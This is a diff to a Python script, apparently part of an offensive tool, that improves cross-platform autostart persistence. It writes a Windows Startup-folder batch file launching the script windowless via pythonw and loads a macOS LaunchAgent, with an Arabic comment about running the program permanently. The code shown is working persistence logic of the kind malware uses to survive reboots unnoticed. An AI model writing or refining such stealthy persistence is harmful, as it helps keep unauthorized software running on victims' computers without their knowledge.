@@ -290,7 +290,8 @@ WantedBy=default.target
         startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
         target_path = os.path.join(startup_folder, f"{output_filename}.bat")
         with open(target_path, 'w') as f:
-            f.write(f"@echo off\nstart pythonw {os.path.abspath(output_filename)}\n")
+            pythonw_path = shutil.which("pythonw") or "python"
+            f.write(f"@echo off\nstart {pythonw_path} {os.path.abspath(output_filename)}\n")
 
     elif system == "Darwin":
         print("[*] System: macOS - Setting up Launch Agent...")
@@ -323,6 +324,10 @@ WantedBy=default.target
         subprocess.run(["launchctl", "load", plist_file_path])
 
         print(f"[+] Launch Agent created: {plist_file_path}")
+        try:
+            subprocess.run(["launchctl", "load", plist_file_path], check=True)
+        except subprocess.CalledProcessError:
+            print("[!] Failed to load LaunchAgent. Check permissions or SIP settings.")
 
 
 # ===== تشغيل البرنامج بشكل دائم =====
